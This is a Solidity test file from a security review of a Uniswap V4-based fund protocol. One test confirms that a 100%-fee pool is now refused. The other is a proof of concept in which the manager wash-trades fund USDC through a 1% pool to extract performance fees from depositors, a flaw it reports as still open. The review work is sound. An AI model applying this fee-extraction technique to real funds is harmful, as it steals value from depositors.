// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ManagerFeeVault} from "../../../src/core/ManagerFeeVault.sol";
import {UniswapV4Adapter} from "../../../src/adapters/UniswapV4Adapter.sol";
import {FundFactory} from "../../../src/factory/FundFactory.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {Mandate} from "../../../src/mandate/Mandate.sol";
import {IntegrationPriceBase} from "./IntegrationPriceBase.sol";

/// @notice Part 1.4 of the integration-price review: report 06 M-01 (one-shot variant) through the real FundFactory.
///         The manager's Mandate lists, next to the scripts' hub pool, a hookless WETH/USDC pool with a 1,000,000-pip
///         (100%) static LP fee that anyone may initialize. The performance fee is the scripts' 20% and the protocol
///         slice the registry's default 50%. e5c778a: the factory accepted it; one swap of 198,000 USDC returned 0, the
///         manager withdrew 19,800 and the protocol took 19,800.
/// @notice Ported to fix/pp-sc-fix-independent-review (review M-02): the V4 adapter's constructor refuses the pool
///         (`PoolFeeTooHigh`) and the factory bubbles it, so `createFund` reverts. At the 1% cap the channel stays: the
///         second test washes the fund's own Unallocated USDC through a 1% Mandate pool in which it is the only LP.
/// @dev Run: ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc ARBITRUM_FORK_BLOCK=<head - 300>
///      forge test -j 1 --match-path 'test/review/integration-price/FeeTierFork.t.sol' -vv
contract FeeTierFork is IntegrationPriceBase {
    uint256 internal constant ROUND_TRIPS = 50;
    uint256 internal constant LEG = 20_000e6;

    function _initialize(uint24 fee) internal returns (PoolKey memory key) {
        (uint160 sqrtP,,,) = IStateView(ARB_V4_STATE_VIEW).getSlot0(_hubPoolKey().toId());
        key = PoolKey(Currency.wrap(ARB_WETH), Currency.wrap(ARB_USDC), fee, 60, IHooks(address(0)));
        IPoolManager(ARB_V4_POOL_MANAGER).initialize(key, sqrtP); // anyone can
    }

    function test_REVIEW_M02_factoryRefusesAFullFeePool() public {
        _arbitrumOnly();
        PoolKey memory fullFee = _initialize(1_000_000);
        PoolKey[] memory extra = new PoolKey[](1);
        extra[0] = fullFee;

        // `_createFund` of the base, unrolled so the revert of `createFund` itself is the one expected.
        FundPlan memory plan = _pricePlan(SPOKE_CAP);
        hubDeployment = _deployProtocol(recipient, guardian, registryOwner);
        FundFactory factory = hubDeployment.factory;
        creationNumber = factory.nextCreationNumber();
        fundId = factory.fundIdOf(ARBITRUM, creationNumber, manager);
        Mandate memory m = _withExtraHubPools(_buildMandate(factory, fundId, plan), extra, false);
        IFundFactory.HubParams memory p =
            _hubParams(creationNumber, plan, _coreVaultCreationCode(hubDeployment.coreVaultLogic));
        PoolKey[] memory keys = new PoolKey[](2);
        keys[0] = plan.hubPool;
        keys[1] = fullFee;
        p.uniswapV4Pools = keys;
        _fundManagerSeed(ARB_USDC, manager, address(factory), p.seedAmount);

        vm.expectRevert(
            abi.encodeWithSelector(
                UniswapV4Adapter.PoolFeeTooHigh.selector, PoolId.unwrap(fullFee.toId()), uint24(1_000_000)
            )
        );
        vm.prank(manager);
        factory.createFund(m, p);
    }

    /// @dev STILL PRESENT at the cap (performance fee net of the fund's own swap fees is open): the manager washes its
    ///      own Unallocated USDC through a 1% Mandate pool where the fund is the only LP; nothing bounds the number of
    ///      round trips, so the one-shot effect of the 100% pool is reached in about fifty calls.
    function test_POC_REVIEW_M02_onePercentPoolWashThroughTheFactory() public {
        _arbitrumOnly();
        PoolKey memory onePct = _initialize(10_000);
        PoolKey[] memory extra = new PoolKey[](1);
        extra[0] = onePct;
        _createFund(_pricePlan(SPOKE_CAP), extra, false);
        bytes32 onePctId = PoolId.unwrap(onePct.toId());
        (address t0, address t1) = SpokeVault(address(hubSpoke)).poolTokens(hubUniswap, onePctId);
        assertEq(t0, ARB_WETH, "the factory-created fund lists the 1% pool");
        assertEq(t1, ARB_USDC);

        _deposit(alice, 1_000_000e6);
        _allocate(400_000e6);
        // A +-10% position of about 100,000 in the 1% pool: the fund is its only LP.
        uint256 wethBought = _buyWethInChunks(hubKey, 50_000e6, 10);
        (lastLower, lastUpper) = _ticksAround(onePct, 100_000, 100_000);
        bytes memory params = abi.encode(
            UniswapV4Adapter.OpenParams({
                tickLower: lastLower,
                tickUpper: lastUpper,
                liquidity: 0,
                amount0Max: SafeCast.toUint128(wethBought),
                amount1Max: 50_000e6,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
        vm.prank(manager);
        (bytes32 pk,,) = hubSpoke.openPosition(hubUniswap, onePctId, wethBought, 50_000e6, params);

        uint256 holdersBefore =
            core.shareAssets() + _usd(core.collectedIncome(ARB_WETH), core.collectedIncome(ARB_USDC));
        uint256 protocolBefore = _usd(IERC20(ARB_WETH).balanceOf(recipient), IERC20(ARB_USDC).balanceOf(recipient));
        bytes memory swapParams = _swapParams();
        for (uint256 i; i < ROUND_TRIPS; ++i) {
            vm.prank(manager);
            uint256 wethOut = hubSpoke.swapExactInput(hubUniswap, onePctId, ARB_USDC, LEG, 0, swapParams);
            vm.prank(manager);
            hubSpoke.swapExactInput(hubUniswap, onePctId, ARB_WETH, wethOut, 0, swapParams);
        }
        vm.prank(manager);
        IAdapter.Amounts memory income = hubSpoke.collectIncome(hubUniswap, pk);
        vm.startPrank(makeAddr("anyone"));
        if (hubSpoke.collectedIncome(ARB_WETH) != 0) hubSpoke.forwardIncomeToCoreVault(ARB_WETH);
        if (hubSpoke.collectedIncome(ARB_USDC) != 0) hubSpoke.forwardIncomeToCoreVault(ARB_USDC);
        vm.stopPrank();
        uint256 managerCut =
            _usd(IERC20(ARB_WETH).balanceOf(managerFeeVault), IERC20(ARB_USDC).balanceOf(managerFeeVault));
        uint256 protocolCut =
            _usd(IERC20(ARB_WETH).balanceOf(recipient), IERC20(ARB_USDC).balanceOf(recipient)) - protocolBefore;
        uint256 holdersAfter = core.shareAssets() + _usd(core.collectedIncome(ARB_WETH), core.collectedIncome(ARB_USDC));
        uint256 incomeUsd = _usd(income.income0, income.income1);

        console2.log("===== factory-created fund, 1% Mandate pool, fund the only LP");
        console2.log("wash volume (USDC)", 2 * LEG * ROUND_TRIPS);
        console2.log("income reported by the adapter, WETH / USDC", income.income0, income.income1);
        console2.log("income (USDC at the oracle)", incomeUsd);
        console2.log("holders' value lost (Share Assets + Attributed Income)", holdersBefore - holdersAfter);
        console2.log("manager fee vault", managerCut);
        console2.log("protocol slice", protocolCut);
        assertGt(incomeUsd, 2 * LEG * ROUND_TRIPS * 95 / 10_000, "over 0.95% of the volume came back as income");
        assertApproxEqRel(managerCut, incomeUsd / 10, 0.01e18, "the manager took 10% of it (20% fee, 50% slice)");
        assertApproxEqRel(protocolCut, incomeUsd / 10, 0.01e18, "the protocol took 10%");
        assertApproxEqRel(holdersBefore - holdersAfter, managerCut + protocolCut, 0.05e18, "the holders paid both");
    }

    function _usd(uint256 weth, uint256 usdc) internal view returns (uint256) {
        return usdc + Math.mulDiv(weth, _oracle(), 1e18);
    }
}
